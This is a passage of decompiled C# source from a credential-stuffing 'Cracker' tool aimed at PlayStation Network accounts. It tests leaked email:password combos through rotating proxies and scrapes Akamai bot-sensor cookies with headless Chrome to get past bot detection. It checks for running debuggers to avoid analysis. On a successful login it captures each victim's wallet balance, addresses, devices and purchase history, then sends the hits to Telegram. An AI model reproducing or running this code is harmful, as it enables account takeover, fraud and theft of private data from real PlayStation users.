											Sensor sensor2 = randomFromList;
											int totalUses = sensor2.TotalUses;
											sensor2.TotalUses = totalUses - 1;
										}
									}
									catch (Exception ex2)
									{
										this._PError++;
										this.Proxies.Remove(randomProxy);
										this.Accounts.Enqueue(text);
										try
										{
											File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Anti-sensor check login error. ex->> " + ex2.Message + Environment.NewLine);
										}
										catch (Exception)
										{
										}
										Sensor sensor3 = randomFromList;
										int totalUses = sensor3.TotalUses;
										sensor3.TotalUses = totalUses - 1;
									}
								}
							}
						}
					}
					catch (Exception ex3)
					{
						try
						{
							File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Check, hole method exception!ex->" + ex3.ToString() + Environment.NewLine);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x000093F4 File Offset: 0x000075F4
		private string CreateRandomEmail()
		{
			string str = string.Empty;
			str += Convert.ToChar(Cracker.random.Next(65, 90)).ToString();
			for (int i = 0; i < Cracker.random.Next(10, 15); i++)
			{
				str += Convert.ToChar(Cracker.random.Next(97, 122)).ToString();
			}
			string str2 = (Cracker.random.Next(2) == 0) ? "@gmail.com" : "@hotmail.com";
			return str + str2;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x0000948C File Offset: 0x0000768C
		private string CreateRandomPassword()
		{
			string text = string.Empty;
			for (int i = 0; i < Cracker.random.Next(10, 15); i++)
			{
				text += Convert.ToChar(Cracker.random.Next(65, 122)).ToString();
			}
			return text;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x000094E4 File Offset: 0x000076E4
		private bool CookieCheck(ChromeObject obj)
		{
			CookieStorage cookieStorage = obj.GetCookieStorage();
			if (cookieStorage != null)
			{
				Uri uri = new Uri("https://id.sonyentertainmentnetwork.com/signin/?client_id=fe1fdbfa-f1a1-47ac-b793-e648fba25e86&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&service_entity=urn:service-entity:psn&response_type=code&scope=psn:s2s&ui=pr&service_logo=ps&request_locale=en_GB&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin");
				string text = Uri.UnescapeDataString(cookieStorage.GetCookies(uri)["_abck"].Value);
				if (text.Contains("=~-1~-1~-1"))
				{
					UCSensorLeecher leecher = ControlsLink.GetLink().Leecher;
					int goods = leecher.Goods;
					leecher.Goods = goods + 1;
					ControlsLink.GetLink().Leecher.ExecCMD(GeneratorStaticDependencies.Connection, string.Concat(new string[]
					{
						"INSERT INTO Sensors(Cookie,Host) VALUES('",
						text.Split(new char[]
						{
							'~'
						})[2],
						"','",
						uri.Authority,
						"')"
					}));
					obj.Manage().Cookies.DeleteAllCookies();
					return true;
				}
			}
			return false;
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x000095C4 File Offset: 0x000077C4
		public bool CheckIfAnalizerStarted()
		{
			bool result = false;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Contains("http") || process.MainWindowTitle.Contains("HTTP") || process.MainWindowTitle.Contains("debug") || process.MainWindowTitle.Contains("DEBUG") || process.MainWindowTitle.Contains("Analiz") || process.ProcessName.Contains("http") || process.ProcessName.Contains("debug") || process.ProcessName.Contains("HTTP"))
				{
					result = true;
				}
			}
			return result;
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00009694 File Offset: 0x00007894
		private static string getFormattedCurrency(string currency, JToken currencyInfo)
		{
			return (currency == "0") ? "$0" : currency.Insert(currency.Length - (int)currencyInfo["decimalPosition"], currencyInfo["decimalLetter"].ToString()).Insert((!(currencyInfo["symbolPosition"].ToString() == "pre")) ? currency.Length : 0, currencyInfo["symbol"].ToString());
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x00009720 File Offset: 0x00007920
		private void RegCheck()
		{
			string ac;
			int hitPercent;
			ThreadStart <>9__1;
			ParameterizedThreadStart <>9__0;
			while (this._Worker)
			{
				try
				{
					if (this._Worker && this.CheckToContinue_Proxies() && this.CheckToContinue_Accounts())
					{
						string randomProxy = this.GetRandomProxy();
						if (string.IsNullOrEmpty(randomProxy))
						{
							this._PError++;
							this.UpdateUI();
						}
						else
						{
							if (randomProxy.Contains("0:0"))
							{
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop Code A" + Environment.NewLine);
								}
								catch (Exception)
								{
								}
								this.Stop(3);
								break;
							}
							if (this._Checked > 0)
							{
								ac = this.GetAnotherToCheck();
								hitPercent = 0;
								using (HttpRequest httpRequest = new HttpRequest())
								{
									try
									{
										httpRequest.IgnoreProtocolErrors = true;
										httpRequest.Cookies = new CookieStorage(false, null);
										this.SetProxyType(randomProxy, httpRequest);
										httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0";
										HttpResponse httpResponse = httpRequest.Post("https://accounts.api.playstation.com/api/v1/accounts/passwords", "{\"password\":\"" + ac.Split(new char[]
										{
											':'
										})[1] + "\"}", "application/json; charset=UTF-8");
										if (httpResponse.StatusCode == Leaf.xNet.HttpStatusCode.NoContent && httpResponse.StatusCode != Leaf.xNet.HttpStatusCode.BadRequest)
										{
											hitPercent += 19;
											string text = httpRequest.Get("https://signin.ea.com/p/ajax/user/checkEmailExisted?requestorId=portal&email=" + ac.Split(new char[]
											{
												':'
											})[0] + "&fid=RlMxOjEuMDoyLjA6U2NBSVAzNk9BeDZzNEpIT2lvY3pPbndYOm9kbmE3&_=1536941267014", null).ToString();
											if (text.Contains("register_email_existed"))
											{
												hitPercent += 50;
											}
											else
											{
												hitPercent -= 19;
											}
											text = httpRequest.Post("https://accounts.api.playstation.com/api/v1/accounts/onlineIds", "{\"onlineId\":\"" + ac.Split(new char[]
											{
												':'
											})[0].Split(new char[]
											{
												'@'
											})[0] + "\",\"reserveIfAvailable\":false}", "application/json; charset=UTF-8").ToString();
											if (text.Contains("Account with this online id already exists"))
											{
												hitPercent += 30;
											}
										}
										else
										{
											hitPercent = -100;
										}
										if (hitPercent > 0)
										{
											this._Hit++;
											this._Checked--;
											try
											{
												this.UpdateUI();
												ParameterizedThreadStart start;
												if ((start = <>9__0) == null)
												{
													start = (<>9__0 = delegate(object <p0>)
													{
														Thread.Sleep(Cracker.random.Next(200));
														Control control = this.activityView;
														ThreadStart method;
														if ((method = <>9__1) == null)
														{
															method = (<>9__1 = delegate()
															{
																Saver.SaveThis(ac, SavePath.RegChecked, this.activityView.Accounts_rtb, "");
																Saver.SaveThis(ac, SavePath.RegChecked, null, hitPercent.ToString());
																Saver.SaveThis(ac.PadRight(50, ' ') + " " + hitPercent.ToString() + "%", SavePath.SiteChecker, this.activityView.SiteChecker_rtb, "");
															});
														}
														control.Invoke(method);
													});
												}
												new Thread(start).Start();
												goto IL_2BD;
											}
											catch (NullReferenceException)
											{
												goto IL_2BD;
											}
											catch (Exception)
											{
												goto IL_2BD;
											}
										}
										this._Bads++;
										this._Checked--;
										this.UpdateUI();
										IL_2BD:;
									}
									catch (HttpException)
									{
										this._PError++;
										this.UpdateUI();
										this.Accounts.Enqueue(ac);
									}
									catch (Exception)
									{
										this._PError++;
										this.UpdateUI();
										this.Accounts.Enqueue(ac);
									}
								}
								this.Proxies.Remove(randomProxy);
							}
							else
							{
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop Code B" + Environment.NewLine);
								}
								catch (Exception)
								{
								}
								this.Stop(3);
							}
						}
					}
				}
				catch (Exception ex)
				{
					try
					{
						File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Reg, hole method exception!ex->" + ex.Message + Environment.NewLine);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00009BA8 File Offset: 0x00007DA8
		private void CaptureAccount(string ac, string proxy, CookieStorage storage)
		{
			StringBuilder stringBuilder = new StringBuilder();
			new Thread(delegate()
			{
			}).Start();
			stringBuilder.AppendLine("====================<<Info>>====================");
			stringBuilder.AppendLine("Combo: " + ac);
			stringBuilder.AppendLine("Proxy: " + proxy);
			stringBuilder.AppendLine("Time: " + DateTime.Now.ToString());
			JToken jtoken = null;
			JToken jtoken2 = null;
			JToken jtoken3 = null;
			JToken jtoken4 = null;
			JToken currencyInfo = null;
			bool flag = false;
			string text = null;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetProxyType(proxy, httpRequest);
					httpRequest.IgnoreProtocolErrors = true;
					httpRequest.Cookies = storage;
					httpRequest.Get("https://store.playstation.com/en-us/home/games", null);
					httpRequest.AddHeader(HttpHeader.Referer, "https://store.playstation.com/en-us/home/games");
					string text2 = Guid.NewGuid().ToString();
					string str = "f6c7057b-f688-4744-91c0-8179592371d2";
					HttpResponse httpResponse = httpRequest.Get("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=" + str + "&scope=kamaji:commerce_native,kamaji:commerce_container,kamaji:lists&redirect_uri=https://store.playstation.com/html/webIframeRedirect.html?requestId=" + text2, null);
					httpRequest.AddHeader(HttpHeader.Referer, "https://store.playstation.com/en-us/home/games");
					httpRequest.AddHeader("Kamaji-Client", "valkyrie_storefront");
					httpRequest.AddHeader("Origin", "https://store.playstation.com");
					httpRequest.AddHeader("X-Alt-Referer", "https://store.playstation.com/html/webIframeRedirect.html?requestId=" + text2);
					string value = Regex.Match(httpResponse.Address.AbsoluteUri, "&code=(.*)&cid").Groups[1].Value;
					string text3 = httpRequest.Post("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session", "code=" + value, "application/x-www-form-urlencoded").ToString();
					if (!text3.Contains("accountId"))
					{
						stringBuilder.AppendLine("<<" + (string)JObject.Parse(text3)["header"]["message_key"] + ">>" + Environment.NewLine);
						stringBuilder.AppendLine("============Account-Problem============" + Environment.NewLine);
					}
					else
					{
						string str2 = string.Empty;
						try
						{
							str2 = (string)JObject.Parse(text3)["data"]["onlineId"];
						}
						catch
						{
						}
						httpResponse = httpRequest.Get("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?ui=pr&response_type=token&scope=openid%3Auser_id%20openid%3Aonline_id%20openid%3Actry_code%20openid%3Alang%20user%3Aaccount.communication.get%20kamaji%3Aget_account_hash%20oauth%3Amanage_user_auth_sessions%20openid%3Aacct_uuid%20user%3Aaccount.authentication.mode.get%20user%3Aaccount.authentication.mode.update%20oauth%3Amanage_backup_codes%20openid%3Aacct_id_str%20oauth%3Amanage_devicepasswords%20user%3Aaccount.phone.masked.get%20user%3Aaccount.notification.create%20user%3Aaccount.phone.create%20user%3Aaccount.phone.main.update%20user%3Aaccount.phone.delete%20openid%3Acontent_ctrl%20user%3Aaccount.changepassword.update%20user%3Aaccount.subaccounts.get%20openid%3Aage%20user%3Aaccount.graduate%20user%3AverifiedAccount.get%20kamaji%3Aaccount_link_user_link_account%20kamaji%3Aget_privacy_settings%20kamaji%3Aactivity_feed_get_feed_privacy%20kamaji%3Agame_list%20kamaji%3Aset_privacy_settings.gated%20kamaji%3Aactivity_feed_set_feed_privacy%20user%3Aaccount.communication.update.gated%20kamaji%3Akfs_images.upload%20kamaji%3Akfs_images.get%20kamaji%3Akfs_images.delete%20user%3Aaccount.communication.update%20user%3Aaccount.profile.get%20user%3Aaccount.profile.update%20kamaji%3Aget_internal_entitlements%20ias%3Aaccount.onlineIdChange.get%20user%3Aaccount.onlineId.get%20ias%3Aaccount.onlineIdChange.create.gated%20user%3AonlineIdSuggestion.get%20user%3Aaccount.myinvitations.get.gated%20user%3Aaccount.familyinvitationinvitee.update.gated%20user%3Aaccount.coppa.get%20user%3Aaccount.usage.tracking.get%20user%3Aoffline.account.usage.tracking.get%20wallets%3Ainstrument.get.gated%20wallets%3Apreference.get.gated%20user%3Aaccount.familymembers.role.update.gated%20user%3Aaccount.familymembers.get.gated%20user%3Aaccount.familymembers.parentalControls.update.gated%20user%3Aaccount.familymembers.password.update.gated%20user%3Aaccount.familymembers.delete.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.bedTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.wakeupTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.timezone.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.playTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.overrides.create.gated%20user%3Aoffline.account.role.update.gated%20user%3Aoffline.account.get.gated%20user%3Aoffline.account.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.wakeupTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.bedTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.playTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.overrides.create.gated%20user%3Aoffline.account.parentalControls.scheduleBased.timezone.update.gated%20user%3Aaccount.familyinvitations.get.gated%20user%3Aaccount.familyinvitation.create.gated%20user%3Aaccount.familyinvitation.get.gated%20user%3Aaccount.familyinvitation.update.gated%20user%3Aaccount.coppa.validate.gated%20user%3Aaccount.identityMapper%20user%3Aaccount.email.create%20user%3Aaccount.emailVerification.get%20user%3Aaccount.address.create.gated%20user%3Aaccount.address.update.gated%20user%3Aaccount.address.get.gated%20user%3Aaccount.personal.get%20user%3Aaccount.personal.update.gated%20user%3Aaccount.tosua.update%20user%3Aaccount.languages.get%20user%3Aaccount.language.update.gated%20user%3Aaccount.pin.update.gated&redirect_uri=https%3A%2F%2Fid.sonyentertainmentnetwork.com%2Fid%2Fmanagement%2F4281081877cbba2efce6192277c692113ce97e16%2Fassets%2Fimplicit_complete.html&client_id=ce381e15-9cdd-4cf9-8384-0cf63db17f6a&state=c3ff97c41fa62bcdc3954710e55ca059&prompt=none&cid=" + str + "&entry=%2Fp", null);
						string value2 = Regex.Match(httpResponse.Address.ToString(), "#access_token=(.*?)&").Groups[1].Value;
						httpRequest.AddHeader("Authorization", "Bearer " + value2);
						try
						{
							jtoken = JToken.Parse(httpRequest.Get("https://accounts.api.playstation.com/api/v1/accounts/me/addresses", null).ToString());
						}
						catch (Exception)
						{
						}
						httpRequest.AddHeader("Authorization", "Bearer " + value2);
						try
						{
							jtoken2 = JToken.Parse(httpRequest.Get("https://wallets.api.playstation.com/api/v1/wallets/me", null).ToString());
						}
						catch (Exception)
						{
						}
						httpResponse = httpRequest.Get("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2C3DS%3AtransactionData.update%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D960b13b4-c60e-47ec-aecd-35899bdcbc23", null);
						value2 = Regex.Match(httpResponse.Address.ToString(), "#access_token=(.*?)&").Groups[1].Value;
						httpRequest.AddHeader("Authorization", "Bearer " + value2);
						try
						{
							currencyInfo = JToken.Parse(httpRequest.Get("https://wallets.api.playstation.com/api/v1/wallets/me/currencyDetails", null).ToString());
						}
						catch (Exception)
						{
						}
						httpRequest.AddHeader("Authorization", "Bearer " + value2);
						try
						{
							jtoken3 = JToken.Parse(httpRequest.Get("https://accounts.api.playstation.com/api/v1/accounts/me/core", null).ToString());
						}
						catch (Exception)
						{
						}
						httpRequest.AddHeader("Authorization", "Bearer " + value2);
						try
						{
							jtoken4 = JToken.Parse(httpRequest.Get("https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + (string)jtoken3["accountId"] + "&limit=500&startDate=2012-06-07T00%3A00%3A00.000%2B0430&endDate=2019-09-07T23%3A59%3A59.999%2B0430&includePurged=false&transactionTypes=PRODUCT_PURCHASE,VOUCHER_PURCHASE", null).ToString());
						}
						catch (Exception)
						{
						}
						try
						{
							httpResponse = httpRequest.Get("https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action", null);
							httpResponse = httpRequest.Get("https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false", null);
							text = httpResponse.ToString();
						}
						catch (Exception)
						{
						}
						flag = (text != null && text.Contains("Deactivate All"));
						stringBuilder.AppendLine("Deactiveable: " + flag.ToString());
						string str3 = (jtoken == null) ? "Error capturing" : ((string)jtoken[0]["country"]);
						string str4 = (jtoken3 == null) ? "Error capturing" : ((string)jtoken3["region"]);
						stringBuilder.AppendLine("Country/Region: " + str3 + "/" + str4);
						try
						{
							int num = int.Parse(Regex.Match(text, "<span id=\"deviceCount_4\" class=\"deviceCount\">(.*?)</span>").Groups[1].Value);
							stringBuilder.AppendLine("Device Count: " + num.ToString());
							stringBuilder.Append("Devices: ");
							for (int i = 0; i < num; i++)
							{
								stringBuilder.Append(Regex.Match(text, "<span id=\"deviceName-" + i.ToString() + "\" class=\"deviceName\">(.*?)</span>").Groups[1].Value + "/");
							}
						}
						catch (Exception)
						{
						}
						stringBuilder.AppendLine(Environment.NewLine + "OnlineId: " + str2);
						string str5 = (jtoken3 == null) ? "Error capturing" : ((string)jtoken3["language"]);
						stringBuilder.AppendLine("Language: " + str5);
						string text4 = string.Empty;
						try
						{
							text4 = ((jtoken4 == null) ? "Error capturing" : jtoken4["transactions"].Count<JToken>().ToString());
						}
						catch
						{
							text4 = "0";
						}
						stringBuilder.AppendLine("Transactions Count: " + text4);
						string str6 = (jtoken2 == null) ? "Error capturing" : ((string)jtoken2["currentAmount"]);
						string str7 = (jtoken2 == null) ? "Error capturing" : ((string)jtoken2["currencyCode"]);
						stringBuilder.AppendLine("Current Amount: " + str6 + str7);
						if (Convert.ToInt32(text4) > 0)
						{
							try
							{
								stringBuilder.AppendLine("===================<<GAMES>>====================");
								foreach (JToken jtoken5 in ((IEnumerable<JToken>)jtoken4["transactions"]))
								{
									try
									{
										foreach (JToken jtoken6 in ((IEnumerable<JToken>)jtoken5["additionalInfo"]["orderItems"]))
										{
											try
											{
												string str8 = "UnknownProduct!";
												try
												{
													str8 = ((((string)jtoken6["productName"]).Length == 0) ? "Unknown" : ((string)jtoken6["productName"]));
												}
												catch (Exception)
												{
												}
												stringBuilder.AppendLine(str8 + " => [" + Cracker.getFormattedCurrency((string)jtoken6["totalPrice"], currencyInfo) + "]");
											}
											catch (Exception)
											{
											}
										}
									}
									catch (Exception)
									{
									}
								}
							}
							catch (Exception)
							{
							}
						}
						stringBuilder.AppendLine("====================<<END>>=====================");
						if (flag)
						{
							this._deactiveable++;
							this.UpdateUI();
							Saver.SaveThis(stringBuilder.ToString(), SavePath.HasDeactive, this.activityView.HDeactive_rtb, "");
							this.SentHitToTelegram(stringBuilder.ToString());
						}
						else
						{
							this._undeactivable++;
							this.UpdateUI();
						}
					}
					Saver.SaveThis(stringBuilder.ToString(), SavePath.SiteChecker, this.activityView.SiteChecker_rtb, "");
				}
			}
			catch (Exception ex)
			{
				try
				{
					stringBuilder.AppendLine("Deactiveable: " + (text != null && text.Contains("Deactivate All")).ToString());
					string str9 = (jtoken == null) ? "Error capturing" : ((string)jtoken[0]["country"]);
					string str10 = (jtoken3 == null) ? "Error capturing" : ((string)jtoken3["region"]);
					stringBuilder.AppendLine("Country/Region: " + str9 + "/" + str10);
					string str11 = (jtoken3 == null) ? "Error capturing" : ((string)jtoken3["language"]);
					stringBuilder.AppendLine("Language: " + str11);
					string text5 = string.Empty;
					try
					{
						text5 = ((jtoken4 == null) ? "Error capturing" : jtoken4["transactions"].Count<JToken>().ToString());
					}
					catch
					{
						text5 = "0";
					}
					stringBuilder.AppendLine("Transactions Count: " + text5);
					string str12 = (jtoken2 == null) ? "Error capturing" : ((string)jtoken2["currentAmount"]);
					string str13 = (jtoken2 == null) ? "Error capturing" : ((string)jtoken2["currencyCode"]);
					stringBuilder.AppendLine("Current Amount: " + str12 + str13);
					if (Convert.ToInt32(text5) > 0)
					{
						stringBuilder.AppendLine("===================<<GAMES>>====================");
						foreach (JToken jtoken7 in ((IEnumerable<JToken>)jtoken4["transactions"]))
						{
							try
							{
								foreach (JToken jtoken8 in ((IEnumerable<JToken>)jtoken7["additionalInfo"]["orderproxys"]))
								{
									try
									{
										stringBuilder.AppendLine((string)jtoken8["productName"] + " => [" + Cracker.getFormattedCurrency((string)jtoken8["totalPrice"], currencyInfo) + "]");
									}
									catch (Exception)
									{
									}
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
				catch (Exception)
				{
				}
				stringBuilder.AppendLine("Error->" + ex.Message);
				stringBuilder.AppendLine("======================<<ERROR>>=====================");
				this._undeactivable++;
				this.UpdateUI();
				Saver.SaveThis(stringBuilder.ToString(), SavePath.SiteChecker, this.activityView.SiteChecker_rtb, "");
			}
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000A828 File Offset: 0x00008A28
		private void SensorLeechSEL()
		{
			while (this._Worker)
			{
				if (this._Worker && this.CheckToContinue_Proxies())
				{
					string randomProxy = this.GetRandomProxy();
					try
					{
						if (string.IsNullOrEmpty(randomProxy))
						{
							this._PError++;
							this.UpdateUI();
						}
						else
						{
							if (randomProxy.Contains("0:0"))
							{
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code S" + Environment.NewLine);
								}
								catch (Exception)
								{
								}
								this.Stop(3);
								break;
							}
							string proxyScheme = this.GetProxyScheme(randomProxy);
							try
							{
								using (ChromeObject chromeObject = new ChromeObject(new Uri("https://id.sonyentertainmentnetwork.com/signin/?smcid=pc%3Apsnow%3Atop&applicationId=psnow&response_type=code&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&client_id=bc6b0777-abb5-40da-92ca-e133cf18e989&redirect_uri=https%3A%2F%2Fpsnow.playstation.com%2Fapp%2F1.10.35%2F82%2F886df1f%2Fgrc-response.html%23signin&service_entity=urn%3Aservice-entity%3Apsn&prompt=login&request_locale=en-US&renderMode=mobilePortrait&hidePageElements=forgotPasswordLink&displayFooter=none&disableLinks=qriocityLink&mid=PSNOW&duid=000000070040008866343a36643a30343a64333a61393a6539&layout_type=popup&service_logo=ps&tp_psn=true&noEVBlock=true&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=true#/signin?entry=%2Fsignin"), ChromeObject.CreateCrackerOption(proxyScheme, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"), ChromeObject.CreateHiddenService()))
								{
									try
									{
										int num = 0;
										int num2;
										for (;;)
										{
											num++;
											if (!this.CookieCheck(chromeObject))
											{
												IWebElement webElement = chromeObject.FindElement(By.Id("ember18"));
												IWebElement element = chromeObject.FindElement(By.Id("ember20"));
												webElement.Clear();
												chromeObject.SendHumansKey(this.CreateRandomEmail(), webElement);
												if (!this.CookieCheck(chromeObject))
												{
													chromeObject.SendHumansKey(OpenQA.Selenium.Keys.Tab, webElement);
													if (!this.CookieCheck(chromeObject))
													{
														chromeObject.SendHumansKey(this.CreateRandomPassword(), element);
														if (!this.CookieCheck(chromeObject))
														{
															chromeObject.SendHumansKey(OpenQA.Selenium.Keys.Tab, element);
															if (!this.CookieCheck(chromeObject))
															{
																break;
															}
														}
													}
												}
											}
											UCSensorLeecher leecher = ControlsLink.GetLink().Leecher;
											num2 = leecher.AllTries;
											leecher.AllTries = num2 + 1;
											if (num >= 3)
											{
												goto IL_209;
											}
											chromeObject.Manage().Cookies.DeleteAllCookies();
											chromeObject.Navigate().Refresh();
										}
										UCSensorLeecher leecher2 = ControlsLink.GetLink().Leecher;
										num2 = leecher2.AllTries;
										leecher2.AllTries = num2 + 1;
										UCSensorLeecher leecher3 = ControlsLink.GetLink().Leecher;
										num2 = leecher3.Bads;
										leecher3.Bads = num2 + 1;
										this.Proxies.Remove(randomProxy);
										IL_209:;
									}
									catch (Exception ex)
									{
										this.Proxies.Remove(randomProxy);
										UCSensorLeecher leecher4 = ControlsLink.GetLink().Leecher;
										int num2 = leecher4.Errors;
										leecher4.Errors = num2 + 1;
										chromeObject.Dispose();
										try
										{
											File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Driver ObjectException| ex->> " + ex.Message);
										}
										catch (Exception)
										{
										}
									}
								}
							}
							catch (Exception ex2)
							{
								UCSensorLeecher leecher5 = ControlsLink.GetLink().Leecher;
								int num2 = leecher5.Errors;
								leecher5.Errors = num2 + 1;
								this.Proxies.Remove(randomProxy);
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Leech error. ex->> " + ex2.Message + Environment.NewLine);
								}
								catch (Exception)
								{
								}
							}
						}
					}
					catch (Exception ex3)
					{
						try
						{
							File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Check, hole method exception!ex->" + ex3.ToString() + Environment.NewLine);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x060000CB RID: 203 RVA: 0x0000AC0C File Offset: 0x00008E0C
		private async Task<HttpResponseMessage> LogIn(string ac, string px, CookieContainer cc, CookieContainer cc1)
		{
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			ServicePointManager.Expect100Continue = false;
			HttpResponseMessage result;
			using (HttpClient postRequestClient = new HttpClient(this.getHandler(cc1, px, false)))
			{
				postRequestClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0");
				postRequestClient.DefaultRequestHeaders.Add("Origin", "https://id.sonyentertainmentnetwork.com");
				postRequestClient.DefaultRequestHeaders.Referrer = new Uri("https://id.sonyentertainmentnetwork.com/");
				string content2 = " ";
				new HttpResponseMessage();
				HttpResponseMessage httpResponseMessage = await postRequestClient.PostAsync(this.sensorPath, new System.Net.Http.StringContent(content2, Encoding.UTF8, "text/plain")).ConfigureAwait(false);
				result = httpResponseMessage;
				httpResponseMessage = null;
				content2 = null;
			}
			HttpClient postRequestClient = null;
			foreach (object obj in cc1.GetCookies(new Uri("https://id.sonyentertainmentnetwork.com")))
			{
				System.Net.Cookie item = (System.Net.Cookie)obj;
				if (!item.Value.Contains("0~-1~") && item.Value != "")
				{
					cc.Add(item);
				}
				item = null;
			}
			IEnumerator enumerator = null;
			using (HttpClient httpClient = new HttpClient(this.getHandler(cc, px, false)))
			{
				httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0");
				httpClient.DefaultRequestHeaders.Add("Origin", "https://id.sonyentertainmentnetwork.com");
				httpClient.DefaultRequestHeaders.Referrer = new Uri("https://id.sonyentertainmentnetwork.com/");
				string content3 = string.Concat(new string[]
				{
					"{\"authentication_type\":\"password\",\"username\":\"",
					ac.Split(new char[]
					{
						':'
					})[0],
					"\",\"password\":\"",
					ac.Split(new char[]
					{
						':'
					})[1],
					"\",\"client_id\":\"71a7beb8-f21a-47d9-a604-2e71bee24fe0\"}"
				});
				new HttpResponseMessage();
				HttpResponseMessage httpResponseMessage2 = await httpClient.PostAsync("https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie", new System.Net.Http.StringContent(content3, Encoding.UTF8, "application/json")).ConfigureAwait(false);
				result = httpResponseMessage2;
				httpResponseMessage2 = null;
				content3 = null;
			}
			HttpClient httpClient = null;
			return result;
		}

		// Token: 0x060000CC RID: 204 RVA: 0x0000AC70 File Offset: 0x00008E70
		private WebRequestHandler getHandler(CookieContainer cookieContainer, string proxy, bool AllowAutoRedirect = false)
		{
			WebRequestHandler webRequestHandler;
			try
			{
				webRequestHandler = new WebRequestHandler();
				webRequestHandler.UseProxy = true;
				webRequestHandler.Proxy = new WebProxy(proxy.Split(new char[]
				{
					':'
				})[0], int.Parse(proxy.Split(new char[]
				{
					':'
				})[1]));
				webRequestHandler.UseCookies = true;
				webRequestHandler.CookieContainer = cookieContainer;
				webRequestHandler.AllowAutoRedirect = AllowAutoRedirect;
			}
			catch
			{
				throw new Exception("Can't create Hanlder");
			}
			return webRequestHandler;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x0000ACF8 File Offset: 0x00008EF8
		private async void AccountCheckAntiSensorAsync()
		{
			while (this._Worker)
			{
				Application.DoEvents();
				if (this._Worker && this.CheckToContinue_Proxies() && this.CheckToContinue_Accounts())
				{
					string randomProxy = this.GetRandomProxy();
					try
					{
						if (string.IsNullOrEmpty(randomProxy))
						{
							this._PError++;
							this.UpdateUI();
						}
						else
						{
							if (randomProxy.Contains("0:0"))
							{
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code S" + Environment.NewLine);
								}
								catch (Exception)
								{
								}
								this.Stop(3);
								break;
							}
							if (this._Checked > 0)
							{
								string anotherToCheck = null;
